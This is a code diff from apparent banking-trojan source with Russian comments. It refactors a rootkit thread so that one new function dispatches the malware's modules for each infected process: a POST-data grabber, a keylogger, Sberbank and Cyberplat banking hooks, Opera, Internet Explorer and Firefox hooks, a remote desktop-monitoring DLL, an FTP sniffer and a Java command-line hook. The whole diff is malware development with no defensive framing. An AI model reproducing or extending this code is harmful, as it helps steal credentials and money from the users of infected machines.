@@ -409,6 +409,84 @@ DWORD GetPidByThread(HANDLE hThread )
 
 
 
+void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
+{
+	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+	//инициализируем систему оповещения о пост данных, должен быть запущен раньше кейлогера
+	//т. к. в кейлогере есть системы которым нужен инициализированный модуль PostDataGrabber
+	#ifdef PostDataGrabberH
+		PostDataGrabber::Init();
+	#endif
+
+	#ifdef KeyLogSystemsH
+		StartKeyLogger(Data->Application);
+	#endif
+
+	#ifdef SBERH
+		Sber::Init( Data->Application, AppHash);
+	#endif
+
+	#ifdef CyberPlatDLLH
+		if (CyberPlatCheckApplication(Data->Application)) return;
+	#endif
+
+	#ifdef CyberPlatH
+		if( IsCyber2Process() )
+		{
+			HookCyberplat();
+		}
+	#endif
+
+	#ifdef OperaH
+		if (HookOpera()) return;
+
+	#endif
+
+
+    #ifdef InternetExplorerH
+		if ( HookInternetExplorer() )
+		{
+			InternetExplorerStarted(Data);
+			BrowserStarted(Data);
+			return;
+		}
+	#endif
+
+	#ifdef FireFoxH
+		if ( HookMozillaFirefox() )
+		{
+			FireFoxStarted(Data);
+			BrowserStarted(Data);
+			return;
+		}
+    #endif
+
+	//  подгрузка длл которая позволяет удаленно следить за рабочим столом
+	#ifdef PokerH
+		if (IsPoker()) 	return;
+	#endif
+
+	//  хук что ставиться при запуске Ibank Cyberplat как в ехе варианте так и веб
+	#ifdef RuBnkH //
+	   	if (IbankHooksMain())  return;
+	#endif
+
+
+	#ifdef FtpSnifferH
+		FtpSniffer();
+	#endif
+
+	//Хуки на обработку командной строки
+	#ifdef CmdLineH
+		if ( AppHash == 0x150CFBD3 /* java.exe */ || AppHash == 0x1F1AA76A /* javaw.exe */ )
+		{
+			HookCmdLine();
+		}
+	#endif
+}
+
+
+
 DWORD WINAPI RootkitThread(LPVOID)
 {
 	BOT::Initialize();
@@ -420,111 +498,20 @@ DWORD WINAPI RootkitThread(LPVOID)
 	// Подготавливаем данные для события
 	TEventData Data;
 	ClearStruct(Data);
-	DWORD hashApp = 0;
 
 	// Определяем имя приложения
-	PCHAR AppName = STR::Alloc(MAX_PATH);
-	if (AppName != NULL && pGetModuleFileNameA(NULL, AppName, MAX_PATH))
-	{
-		Data.Application = AppName;
-		hashApp = File::GetNameHashA(AppName, true);
-	}
+	string AppName(MAX_PATH);
+	pGetModuleFileNameA(NULL, AppName.t_str(), MAX_PATH);
+	AppName.CalcLength();
 
-    RTKDBG("rotkit", "Запущен процесс %s", AppName );
+	Data.Application = AppName.t_str();
+	DWORD hashApp = File::GetNameHashA((PCHAR)AppName.t_str(), true);
 
-	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-	//инициализируем систему оповещения о пост данных, должен быть запущен раньше кейлогера
-	//т. к. в кейлогере есть системы которым нужен инициализированный модуль PostDataGrabber
-	#ifdef PostDataGrabberH
-		PostDataGrabber::Init();
-	#endif
+    RTKDBG("rotkit", "Запущен процесс %s", AppName.t_str());
 
-	#ifdef KeyLogSystemsH
-		StartKeyLogger(AppName);
-	#endif
-
-	#ifdef SBERH
-		Sber::Init( AppName, hashApp );
-	#endif 
-
-	#ifdef CyberPlatDLLH
-		if (CyberPlatCheckApplication(AppName))
-		{
-			STR::Free(AppName);
-			return 0;
-        }
-	#endif
-
-	#ifdef CyberPlatH
-		if( IsCyber2Process() )
-		{
-			HookCyberplat();
-		}
-	#endif
-
-	#ifdef OperaH
-		if (HookOpera())
-		{
-			STR::Free(AppName);
-			return 0;
-		}
-	#endif
-
-
-    #ifdef InternetExplorerH
-		if ( HookInternetExplorer() )
-		{
-			InternetExplorerStarted(&Data);
-			BrowserStarted(&Data);
-			STR::Free(AppName);
-			return 0;
-		}
-	#endif
-
-	#ifdef FireFoxH
-		if ( HookMozillaFirefox() )
-		{
-			FireFoxStarted(&Data);
-
-			BrowserStarted(&Data);
-
-			STR::Free(AppName);
-			return 0;
-		}
-    #endif
-
-	//  подгрузка длл которая позволяет удаленно следить за рабочим столом
-	#ifdef PokerH
-		if (IsPoker()) 	return 0;
-	#endif
-
-	//  хук что ставиться при запуске Ibank Cyberplat как в ехе варианте так и веб
-	#ifdef RuBnkH //
-	   	if (IbankHooksMain() )		return 0;
-		//if (HookCyberplatPCMain())	return 0;
-	#endif
-
-	/*if ( IsTrade() )
-	{
-		return 0;
-	}*/
-	
-	#ifdef FtpSnifferH 
-		FtpSniffer();
-	#endif
-
-	//Хуки на обработку командной строки
-	#ifdef CmdLineH
-		if ( hashApp == 0x150CFBD3 /* java.exe */ || hashApp == 0x1F1AA76A /* javaw.exe */ )
-		{
-			HookCmdLine();
-			//IbankHooks();
-		}
-	#endif
+	RootkitDoStartApplication(&Data, hashApp);
 
 	ApplicationStarted(&Data);
-
-	STR::Free(AppName);
 
 	return 0;
 }
